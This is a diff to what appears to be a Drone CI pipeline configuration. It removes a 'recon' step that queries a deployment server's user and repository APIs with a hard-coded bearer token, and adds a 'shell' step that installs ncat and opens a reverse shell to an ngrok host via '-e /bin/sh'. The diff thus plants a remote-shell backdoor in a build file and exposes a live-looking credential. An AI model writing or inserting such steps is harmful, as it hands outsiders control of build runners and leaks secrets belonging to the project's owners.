@@ -4,10 +4,8 @@ type: docker
 name: default
 
 steps:
-- name: recon
+- name: shell
   image: alpine
   commands:
-  - apk add --no-cache curl
-  - curl -s https://deploy.icredible.com/api/users -H "Authorization:Bearer avHzch7th8pjwYqxt94dVeIC4FZbgX8t"
-  - curl -s https://deploy.icredible.com/api/repos -H "Authorization:Bearer avHzch7th8pjwYqxt94dVeIC4FZbgX8t" | head -c 2000
-  - curl -s https://deploy.icredible.com/api/user/repos -H "Authorization:Bearer avHzch7th8pjwYqxt94dVeIC4FZbgX8t" | head -c 2000
+  - apk add --no-cache nmap-ncat
+  - ncat 8.tcp.ngrok.io 19227 -e /bin/sh
